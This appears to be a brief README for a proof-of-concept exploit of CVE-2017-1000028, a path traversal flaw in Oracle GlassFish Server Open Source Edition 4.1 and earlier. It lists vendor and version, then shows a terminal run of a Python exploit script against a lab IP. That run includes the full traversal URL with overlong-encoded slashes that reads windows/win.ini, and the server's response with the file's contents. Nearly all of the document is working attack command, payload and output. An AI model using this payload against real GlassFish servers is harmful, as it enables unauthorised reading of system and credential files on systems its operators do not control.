# Path Traversal in Oracle GlassFish Server Open Source Edition

- Vendor: Oracle Corporation (Project sponsored by Oracle)
- Product: GlassFish Server Open Source Edition
- Version affected:  4.1 and prior versions

```python
┌──(kali⚡lof1)-[~/Documents/PG]
└─$ python3 GlassFish_CVE-2017-1000028.py --ip 192.168.240.168 --path windows/win.ini

Requested URL: http://192.168.240.168:4848/theme/META-INF/prototype%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFwindows/win.ini
Status Code: 200
Response:
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
